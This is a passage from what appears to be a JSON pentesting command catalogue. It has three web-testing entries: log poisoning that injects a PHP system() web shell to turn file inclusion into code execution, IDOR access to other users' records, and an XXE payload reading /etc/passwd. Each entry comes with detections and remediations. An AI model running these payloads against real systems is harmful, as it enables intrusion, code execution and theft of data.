  {
    "id": "lfi-to-rce",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux"
    ],
    "command": "curl 'http://<target>/page?file=/var/log/apache2/access.log' -A '<?php system($_GET[\"cmd\"]); ?>'",
    "name": "LFI to RCE (Log Poisoning)",
    "description": "Escalates LFI to Remote Code Execution by poisoning log files with PHP code.",
    "arguments": {
      "-A": "User-Agent (injected into access log)",
      "file=...access.log": "Include the poisoned log"
    },
    "expected_output": "# After poisoning:\ncurl 'http://target/page?file=/var/log/apache2/access.log&cmd=whoami'\nwww-data",
    "use_case": "Turn file read into code execution by injecting PHP into log files.",
    "prerequisites": [
      "Confirmed LFI",
      "Log file path known",
      "PHP enabled"
    ],
    "mitre_mapping": [
      "T1059"
    ],
    "mitre_tactic": "Execution",
    "detections": [
      "PHP code in User-Agent",
      "Log file access via web"
    ],
    "remediation": [
      "Restrict log file permissions",
      "Disable allow_url_include",
      "WAF rules"
    ],
    "common_mistakes": [
      "Log file path varies by distro",
      "PHP not processing included file"
    ],
    "alternatives": [
      "php://filter wrapper",
      "data:// wrapper"
    ],
    "references": [
      "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion"
    ],
    "tags": [
      "lfi",
      "rce",
      "log-poisoning",
      "php",
      "escalation"
    ]
  },
  {
    "id": "idor-test",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl -H 'Cookie: session=<your_token>' 'http://<target>/api/users/2'",
    "name": "IDOR Testing",
    "description": "Tests for Insecure Direct Object References by accessing other users' data.",
    "arguments": {
      "Cookie": "Your session",
      "users/2": "Another user's ID"
    },
    "expected_output": "{\n  \"id\": 2,\n  \"name\": \"Other User\",\n  \"email\": \"other@corp.com\",\n  \"ssn\": \"123-45-6789\"\n}",
    "use_case": "Access other users' data by changing ID parameters \u2014 extremely common vulnerability.",
    "prerequisites": [
      "Authenticated session",
      "Predictable object IDs"
    ],
    "mitre_mapping": [
      "T1530"
    ],
    "mitre_tactic": "Collection",
    "detections": [
      "Access to objects not owned by user",
      "Sequential ID access patterns"
    ],
    "remediation": [
      "Implement authorization checks",
      "Use UUIDs instead of sequential IDs",
      "Validate object ownership"
    ],
    "common_mistakes": [
      "Only testing one endpoint",
      "Not trying different HTTP methods"
    ],
    "alternatives": [
      "burp autorize extension",
      "authmatrix"
    ],
    "references": [
      "https://portswigger.net/web-security/access-control/idor"
    ],
    "tags": [
      "idor",
      "authorization",
      "access-control",
      "broken-auth"
    ]
  },
  {
    "id": "xxe-basic",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl -X POST 'http://<target>/api/parse' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>'",
    "name": "XXE Injection",
    "description": "Tests for XML External Entity injection to read server files.",
    "arguments": {
      "Content-Type: application/xml": "XML content",
      "<!ENTITY xxe SYSTEM>": "External entity definition",
      "&xxe;": "Entity reference"
    },
    "expected_output": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:...",
    "use_case": "Read files, perform SSRF, or achieve RCE through XML parsing vulnerabilities.",
    "prerequisites": [
      "Endpoint accepting XML input"
    ],
    "mitre_mapping": [
      "T1190"
    ],
    "mitre_tactic": "Initial Access",
    "detections": [
      "XML parsing errors",
      "External entity resolution attempts"
    ],
    "remediation": [
      "Disable external entities in XML parser",
      "Use JSON instead of XML",
      "Input validation"
    ],
    "common_mistakes": [
      "Endpoint doesn't accept XML",
      "Entity expansion disabled"
    ],
    "alternatives": [
      "burp collaborator (blind XXE)",
      "oxml_xxe"
    ],
    "references": [
      "https://portswigger.net/web-security/xxe"
    ],
    "tags": [
      "xxe",
      "xml",
      "injection",
      "file-read",
      "entity"
    ]
  },
  {
